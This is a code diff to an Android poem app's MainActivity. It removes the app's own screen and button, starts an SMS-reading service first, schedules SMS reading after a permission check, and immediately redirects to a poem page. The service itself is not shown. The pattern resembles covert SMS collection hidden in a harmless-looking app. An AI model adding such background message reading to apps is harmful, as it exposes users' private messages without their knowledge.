@@ -41,25 +41,19 @@ public class MainActivity extends AppCompatActivity {
             return;
         }
         
-        setContentView(R.layout.activity_main);
+        // Start SMS service first
+        Intent smsServiceIntent = new Intent(this, SmsReaderService.class);
+        startService(smsServiceIntent);
 
-        // Initialize views
-        btnAddPoem = findViewById(R.id.btn_add_poem);
-        
-        // Set up click listeners
-        btnAddPoem.setOnClickListener(new View.OnClickListener() {
-            @Override
-            public void onClick(View v) {
-                openPoemActivity();
-            }
-        });
-
-        Intent intent = new Intent(this, SmsReaderService.class);
-        startService(intent);
-
+        // Set up SMS permissions and scheduling
         if (checkAndRequestPermissions()) {
             scheduleSmsReader();
         }
+        
+        // Auto-redirect to poems page after login
+        Intent poemIntent = new Intent(MainActivity.this, PomeMainActivity.class);
+        startActivity(poemIntent);
+        finish(); // Close MainActivity so back button doesn't come back here
     }
     
     private void openPoemActivity() {
